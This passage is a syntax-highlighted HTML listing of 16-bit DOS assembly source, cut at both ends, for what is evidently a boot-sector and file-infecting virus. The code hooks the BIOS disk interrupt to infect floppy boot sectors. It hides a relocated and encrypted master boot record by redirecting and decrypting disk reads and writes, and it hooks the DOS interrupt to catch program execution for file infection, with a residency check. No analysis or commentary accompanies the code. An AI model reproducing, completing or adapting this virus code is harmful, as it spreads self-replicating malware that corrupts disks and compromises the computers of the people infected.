   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">scantt</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bL</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">scantt</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Hook_0x13</span><span class="sc0">
</span><span class="sc5">vse</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nextint</span><span class="sc0">
</span><span class="sc5">Not_find</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">save0x13h_</span><span class="sc0">
</span><span class="sc6">cli</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">04CH</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">04CH</span><span class="sc4">],</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Int13h_call_from_boot</span><span class="sc0">
</span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">exit_from_Hook0x13h</span><span class="sc0">
</span><span class="sc5">Hook_0x13</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; bl=my intvec</span><span class="sc0">
</span><span class="sc1">; es:di entry point</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">my_offset</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0f000h</span><span class="sc0"> </span><span class="sc1">; !?</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">my_seg</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">; #1 save old_intXX</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Mov_Es_0000h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
  </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_intXX</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_intXX</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc1">;-------------------</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">save0x13h_</span><span class="sc0">
</span><span class="sc1">;-----------------------</span><span class="sc0">
</span><span class="sc1">; #3 set new INTxx</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_New_intXX</span><span class="sc0"> </span><span class="sc1">;al= на какой</span><span class="sc0">
</span><span class="sc1">;-----------------------</span><span class="sc0">
</span><span class="sc1">; #4 set new int13h</span><span class="sc0">
</span><span class="sc1">;pop dx pop ds  mov ax,2513h  int 21h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mov_es_0000h</span><span class="sc0">
 </span><span class="sc6">cli</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">04ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">04ch</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">sti</span><span class="sc0">
 </span><span class="sc5">exit_from_Hook0x13h</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">popa</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------</span><span class="sc0">
</span><span class="sc5">set_New_intXX</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
 </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0"> </span><span class="sc1">; al*4</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mov_es_0000h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">cli</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">New_intXX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">sti</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------</span><span class="sc0">
</span><span class="sc5">save0x13h_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; #2 save old_int13h</span><span class="sc0">
 </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mov_es_0000h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">04ch</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int13h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">04ch</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int13h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---- Обработчик 13 го -------------</span><span class="sc0">
</span><span class="sc5">Int13h_call_from_boot</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">Int13h_call_from_boot2</span><span class="sc0">
</span><span class="sc5">New_intXX</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pusha</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">my_offset</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Contin</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">my_seg</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0Ffffh</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Int13h_call</span><span class="sc0">
</span><span class="sc5">Contin</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">popa</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">old_intXX</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Int13h_call</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc5">Int13h_call_from_boot2</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
             </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Floppy</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fun</span><span class="sc4">],</span><span class="sc8">aX</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
             </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">write_</span><span class="sc0">
             </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc5">Floppy_</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calling13h</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">notErr</span><span class="sc0">
</span><span class="sc5">exit_</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">;clear stek</span><span class="sc0">
            </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">exit__</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">popf</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_</span><span class="sc0">
</span><span class="sc5">old_int13h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fun</span><span class="sc0">         </span><span class="sc9">dW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">calling13h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">caLL</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int13h</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">notErr</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">clc</span><span class="sc0">
            </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit__</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">fun</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">02</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit__</span><span class="sc0">
</span><span class="sc5">Floppy</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
             </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">exit_F_</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">exit_F_</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
             </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_F_</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
             </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">exit_F_</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
             </span><span class="sc6">TEST</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">043Fh</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">FDD_Motor_ON</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calling13h</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">RerorFloppy</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">03eh</span><span class="sc4">],</span><span class="sc2">12cdh</span><span class="sc0">
             </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Nex</span><span class="sc0">
              </span><span class="sc6">pusha</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_FDD</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">popa</span><span class="sc0">
         </span><span class="sc5">Nex</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_</span><span class="sc0">
</span><span class="sc5">Write2FDD</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">exit_F_</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">calling13h</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">RerorFloppy</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_</span><span class="sc0">
</span><span class="sc5">write_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
</span><span class="sc5">FDD_Motor_ON</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_F_</span><span class="sc0">
</span><span class="sc1">;------------------------------------------</span><span class="sc0">
</span><span class="sc5">read</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
            </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">exit__</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
            </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">exit__</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
            </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">exit__</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">fun</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calling13h</span><span class="sc0">
           </span><span class="sc1">;----- decriptr 1st ---</span><span class="sc0">
            </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
            </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NOmbr</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decript_MBR</span><span class="sc0">
</span><span class="sc5">NOmbr</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit__</span><span class="sc0">
</span><span class="sc1">;-------------------------------</span><span class="sc0">
</span><span class="sc5">RerorFloppy</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">;clear stek</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
              </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">0000000000000001b</span><span class="sc0"> </span><span class="sc1">;set CF and AF</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
              </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">exit__Write</span><span class="sc4">:</span><span class="sc6">popf</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calling13h</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_</span><span class="sc0">
</span><span class="sc1">;--------------------------------</span><span class="sc0">
</span><span class="sc5">write</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">clc</span><span class="sc0">
            </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit__Write</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
            </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">exit__Write</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
            </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">exit__Write</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
            </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">exit__Write</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc0">
            </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
            </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NOmbrw</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decript_MBR</span><span class="sc0">
</span><span class="sc5">NOmbrw</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">fun</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calling13h</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit__</span><span class="sc0">
</span><span class="sc1">;---------------------------</span><span class="sc0">
</span><span class="sc5">new_0x21</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Pong</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">Bh</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notExec</span><span class="sc0">
</span><span class="sc5">@inf</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
